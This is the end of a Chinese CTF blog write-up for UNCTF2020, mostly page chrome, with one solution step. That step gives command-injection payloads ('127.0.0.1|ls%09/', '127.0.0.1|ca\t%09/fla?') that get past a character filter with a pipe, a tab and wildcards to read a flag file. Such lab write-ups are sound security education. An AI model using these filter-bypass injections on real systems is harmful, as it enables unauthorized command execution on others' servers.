+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,;,空格，*,flag,cat,$等被过滤了</span><br></pre></td></tr></table></figure>
+
+<p>没有了分号还能用管道符，空格能用%09代替，flag用fla?</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/fla?</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/11/UNCTF2020/9.png" class="">
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2020/11/11/UNCTF2020/" title="UNCTF2020">http://yoursite.com/2020/11/11/UNCTF2020/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/UNCTF/" rel="tag"># UNCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="Apereo-CAS-4.1-反序列化命令执行">
+      <i class="fa fa-chevron-left"></i> Apereo-CAS-4.1-反序列化命令执行
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UNCTF2020赛题部分WP"><span class="nav-number">1.</span> <span class="nav-text">UNCTF2020赛题部分WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyflask"><span class="nav-number">1.1.</span> <span class="nav-text">easyflask</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点"><span class="nav-number">1.1.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程"><span class="nav-number">1.1.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#L0vephp"><span class="nav-number">1.2.</span> <span class="nav-text">L0vephp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ssrf"><span class="nav-number">1.3.</span> <span class="nav-text">easy_ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyunserialize"><span class="nav-number">1.4.</span> <span class="nav-text">easyunserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-number">1.5.</span> <span class="nav-text">ezphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyeval"><span class="nav-number">1.6.</span> <span class="nav-text">babyeval</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.7.</span> <span class="nav-text">easy_upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-6"><span class="nav-number">1.7.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UN’s-online-tools"><span class="nav-number">1.8.</span> <span class="nav-text">UN’s_online_tools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-7"><span class="nav-number">1.8.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-7"><span class="nav-number">1.8.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
